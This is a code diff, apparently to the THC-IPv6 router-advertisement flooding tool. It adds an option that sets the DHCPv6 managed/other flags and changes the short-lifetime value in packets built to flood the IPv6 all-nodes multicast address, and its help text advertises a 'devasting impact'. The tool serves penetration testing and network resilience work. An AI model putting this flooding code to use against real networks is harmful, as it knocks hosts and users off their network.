@@ -28,6 +28,7 @@ void help(char *prg) {
   printf("  -s       use small lifetimes, resulting in a more devasting impact\n");
   printf("  -S       performs a slow start, which can increases the impact\n");
   printf("  -G       gigantic packet of 64kb of prefix/route entries\n");
+  printf("  -m       add DHCPv6 managed/other flags to RA\n");
   exit(-1);
 }
 
@@ -38,21 +39,24 @@ int main(int argc, char *argv[]) {
   unsigned char *dst = thc_resolve6("ff02::1"), *dstmac = thc_get_multicast_mac(dst);
   int size, mtu, i, j, k, type = NXT_ICMP6, route_only = 0, prefix_only = 0, offset = 14;
   unsigned char *pkt = NULL;
-  int pkt_len = 0, rawmode = 0, count = 0, deanon = 0, do_alert = 0, do_hop = 0, do_frag = 0, do_dst = 0, bsize = -1;
+  int pkt_len = 0, rawmode = 0, count = 0, deanon = 0, do_alert = 0, do_hop = 0, do_frag = 0, do_dst = 0, bsize = -1, do_dhcp = 0;
   int cnt, until = 0, lifetime = 0x00ff0100, mfoo, slow = 0, prefer = PREFER_LINK;
   thc_ipv6_hdr *hdr = NULL;
 
   if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
 
-  while ((i = getopt(argc, argv, "DFHRPAarsSG")) >= 0) {
+  while ((i = getopt(argc, argv, "DFHRPAarsmSG")) >= 0) {
     switch (i) {
     case 'r':
       thc_ipv6_rawmode(1);
       rawmode = 1;
       break;
     case 's':
-      lifetime = 0x03000000;
+      lifetime = 0x01000000;
+      break;
+    case 'm':
+      do_dhcp = 128 + 64;
       break;
     case 'S':
       slow = 16;
@@ -268,10 +272,12 @@ int main(int argc, char *argv[]) {
       if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0)
         return -1;
     }
-    if (lifetime != 0x03000000)
+    if (lifetime != 0x01000000)
       mfoo = 0xff08ffff;
     else
-      mfoo = 0xff080003;
+      mfoo = 0xff080001;
+    if (do_dhcp)
+      mfoo = (mfoo | (do_dhcp << 16));
     if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, mfoo, buf, j, 0) < 0)
       return -1;
     if (do_dst || bsize + 40 > thc_get_mtu(interface)) {
